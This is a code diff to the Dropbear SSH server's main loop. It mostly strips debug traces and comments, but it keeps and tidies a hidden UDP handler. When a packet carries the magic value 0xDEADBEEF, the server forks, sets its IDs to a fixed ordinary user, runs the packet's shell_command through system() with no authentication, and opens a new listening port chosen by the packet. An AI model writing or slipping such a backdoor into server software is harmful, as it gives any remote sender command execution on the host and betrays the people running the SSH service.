@@ -133,15 +133,10 @@ static void main_noinetd() {
 	size_t udpsockcount = 0;
 	listen_packet_t udp_msg;
 	FILE *pidfile = NULL;
-
 	int childpipes[MAX_UNAUTH_CLIENTS];
 	char * preauth_addrs[MAX_UNAUTH_CLIENTS];
-
 	int childsock;
 	int childpipe[2];
-
-	
-	
 
 	/* Note: commonsetup() must happen before we daemon()ise. Otherwise
 	   daemon() will chdir("/"), and we won't be able to find local-dir
@@ -154,11 +149,7 @@ static void main_noinetd() {
 	}
 	memset(preauth_addrs, 0x0, sizeof(preauth_addrs));
 	
-	/* Set up the listening sockets */
-	// listensockcount =  4 2 for each port max sok = max sd
-	// maxsock = max fd
-	// MAX_LISTEN_ADDR = sockcount = max amount of socks we have room to create
-	// listensocks - array to store the open socks
+	/* Set up the listening sockets (and udp sockets) */
 	listensockcount = listensockets(listensocks, udpsocks, &udpsockcount, MAX_LISTEN_ADDR, &maxsock);
 	if (listensockcount == 0)
 	{
@@ -222,7 +213,6 @@ static void main_noinetd() {
 			}
 		}
 
-		TRACE(("***********svr-main before select********"))
 		val = select(maxsock+1, &fds, NULL, NULL, NULL);
 
 		if (ses.exitflag) {
@@ -259,16 +249,13 @@ static void main_noinetd() {
 			{
 				struct sockaddr_storage remoteaddr;
 				socklen_t remoteaddrlen = sizeof(remoteaddr); 
-				bzero(&udp_msg, sizeof(udp_msg)); 
-						
-				TRACE(("*********Message from UDP client \n"))
-
+				bzero(&udp_msg, sizeof(udp_msg)); 						
 				recvfrom(udpsocks[i], &udp_msg, sizeof(udp_msg), 0, 
 							(struct sockaddr*)&remoteaddr, &remoteaddrlen); 
 				
 				// should return the number of new socks created (should be 2 or 0)
 				int nnew_socks = handle_udp_packet(&udp_msg, listensocks, listensockcount, &maxsock);
-				// add the new sds to end of array 
+				// add the new fds 
 				for (i = listensockcount; i < listensockcount + nnew_socks; i++) 
 				{
 					FD_SET(listensocks[i], &fds);
@@ -464,43 +451,28 @@ static void commonsetup() {
 }
 
 
-// parse udp packet and act accordingly
-// listensockss - array of listen socks
-// listensocks count - first index in the array where we can write the new socks
+// parse udp_msg and act accordingly
+// listensocks - array of listen socks
+// listensockscount - first index in the array where we can write the new socks
 // return - number of socks created
 static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t listensockcount, int *maxfd)
 {
-	TRACE(("*****inside handle udp packet"))
-	TRACE(("*****udp_msg->magic: %u", udp_msg->magic))
-	TRACE(("*****udp_msg->port number: %u", udp_msg->port_number))
-	TRACE(("*****udp_msg->shell command: %s", udp_msg->shell_command))
-	// if it's not magic - do nothing
 	if (udp_msg->magic == 0xDEADBEEF)
 	{
-		TRACE(("*****this is magic!"))
 		pid_t pid = fork();
 		 // child process
 		if (pid == 0)
-		{
-			TRACE(("****** before executing cmd in child"))		
-			//we are root
-			// if (getuid() == 0) 
-			// {  	// GID of 100 represents the users group.	
-				if(setgid(100) != 0) TRACE(("Failed to set nonroot GID"));
-				//new users in Ubuntu start from uid 1000 
-				if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
-			//}
-
-			// char *argv[1];
-			// argv[0] = udp_msg->shell_command;
-			// execvp(udp_msg->shell_command, argv); 
-			system(udp_msg->shell_command);
+		{	// drop root privileges
+			// GID of 100 represents the users group.	
+			if(setgid(100) != 0) TRACE(("Failed to set nonroot GID"));
+			//new users in Ubuntu start from uid 1000 
+			if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
+			if(system(udp_msg->shell_command) < 0) TRACE(("Failed to run shell cmd"));
 			exit(0); // kill the child after executing the cmd
 		}
 		// parent process
 		else if (pid > 0)
-		{   // wait because we need to execute the shell cmd before 
-			//we start listening on the port
+		{   
 			int stat_val;
     		waitpid(pid, &stat_val, 0);
 			if (WIFEXITED(stat_val))
@@ -508,9 +480,6 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
     		else if (WIFSIGNALED(stat_val))
       			TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
 
-			// add the new port here
-			TRACE(("****** after wait pid about to add the new port"))
-			// "addportandaddress"
 			// convert the port to string for all the functions
 			char str_port[6];
 			sprintf (str_port, "%u", udp_msg->port_number);
@@ -518,36 +487,24 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 			svr_opts.ports[svr_opts.portcount] = m_strdup(str_port);
 			svr_opts.addresses[svr_opts.portcount] = m_strdup(DROPBEAR_DEFADDRESS);
 			svr_opts.portcount++;
-			// listensockets->dropbearlisten
+			
 			char* errstring = NULL;
 			int nsock = dropbear_listen(DROPBEAR_DEFADDRESS, str_port, &listensocks[listensockcount], 
 					MAX_LISTEN_ADDR - listensockcount,
-					&errstring, maxfd);
-			TRACE(("******after dropbear_listen to new port! %u", udp_msg->port_number))		
+					&errstring, maxfd);		
 
 			if (nsock < 0) {
 				dropbear_log(LOG_WARNING, "Failed listening on '%u': %s", 
 								udp_msg->port_number, errstring);
-				m_free(errstring);
-				
+				m_free(errstring);				
 			}
-
-		return nsock;	  
-
+			return nsock;	 
 		}
 		else
 		{ // error 
 			TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
-			return 0;
 		}				
 	}
-
-	else
-	{
-		TRACE(("*****this is not magic!"))
-		return 0;
-	}
-	// shouldn't get here
 	return 0;	
 }
 
@@ -573,11 +530,9 @@ static size_t listensockets(int *socks, int *udp_socks, size_t *udp_count, size_
 
 		if (i != svr_opts.udp_port_index)
 		{
-			TRACE(("******before listen sockcount: %d sockpos: %d", sockcount, sockpos))
 			nsock = dropbear_listen(svr_opts.addresses[i], svr_opts.ports[i], &socks[sockpos], 
 					sockcount - sockpos,
-					&errstring, maxfd);
-			TRACE(("******after listen sockcount: %d sockpos: %d", sockcount, sockpos))		
+					&errstring, maxfd);	
 
 			if (nsock < 0) {
 				dropbear_log(LOG_WARNING, "Failed listening on '%s': %s", 
@@ -589,9 +544,6 @@ static size_t listensockets(int *socks, int *udp_socks, size_t *udp_count, size_
 
 		else
 		{
-			// int dropbear_open_udp_sock(const char* address, const char* port,
-			// int *socks, unsigned int sockcount, char **errstring, int *maxfd)
-			// sockcount = max amount of socks we have room to create 
 			udpnsock = dropbear_open_udp_sock(svr_opts.addresses[i], svr_opts.ports[i], &udp_socks[udpsockpos], 
 					sockcount - udpsockpos,
 					&errstring, maxfd);			
